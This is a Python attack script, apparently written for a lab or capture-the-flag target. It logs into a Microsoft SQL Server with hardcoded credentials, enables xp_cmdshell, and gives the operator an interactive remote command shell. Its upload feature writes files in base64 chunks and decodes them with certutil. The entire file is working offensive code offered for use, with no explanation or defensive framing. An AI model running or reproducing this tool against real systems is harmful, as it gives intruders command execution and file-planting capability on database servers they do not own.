#!/usr/bin/env python
from __future__ import print_function
# Author: Alamot
# Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
# To upload a file, type: UPLOAD local_path remote_path
# e.g. UPLOAD myfile.txt C:\temp\myfile.txt
# If you omit the remote_path it uploads the file on the current working folder.
import pymssql
import base64
import shlex
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass

MSSQL_SERVER="10.13.38.11"
MSSQL_USERNAME = "robot"
MSSQL_PASSWORD = "P@ssword123."
BUFFER_SIZE = 5*1024
TIMEOUT = 30

def process_result(cursor):
    username = ""
    computername = ""
    cwd = ""
    rows = cursor.fetchall()
    for row in rows[:-3]:
        columns = list(row)
        if row[-1]:
            print(row[-1])
        else:
            print()
    if len(rows) >= 3:
        (username, computername) = rows[-3][-1].split('|')
        cwd = rows[-2][-1]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())

def upload(cursor, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    cursor.execute("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(base64.encodebytes(data).split()).decode()

    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        cursor.execute("EXEC xp_cmdshell '"+cmd+"'")

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    cursor.execute("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(cursor)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    cursor.execute("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[-1].strip() for row in cursor.fetchall() if row[-1]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")

def enable_xp_cmdshell(cursor):
    try:
        # Ensure no active transaction before enabling xp_cmdshell
        cursor.execute("IF @@TRANCOUNT > 0 ROLLBACK;")

        # Enable xp_cmdshell
        cursor.execute("EXEC sp_configure 'show advanced options',1; RECONFIGURE;")
        cursor.execute("EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;")
        print("xp_cmdshell enabled.")
    except pymssql.DatabaseError as e:
        print(f"Failed to enable xp_cmdshell: {str(e)}")

def shell():
    conn = None
    stored_cwd = None
    try:
        conn = pymssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        cursor = conn.cursor()
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        # Enable xp_cmdshell
        enable_xp_cmdshell(cursor)

        # Execute initial commands
        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        cursor.execute("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(cursor)
        stored_cwd = cwd

        while True:
            cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call"  # Dummy cmd command
            if cmd.lower()[0:4] == "exit":
                conn.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(cursor, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(cursor, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            cursor.execute("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(cursor)
            stored_cwd = cwd

    except pymssql.DatabaseError as e:
        print(f"Database error: {str(e)}")
    finally:
        if conn:
            conn.close()

shell()
sys.exit()
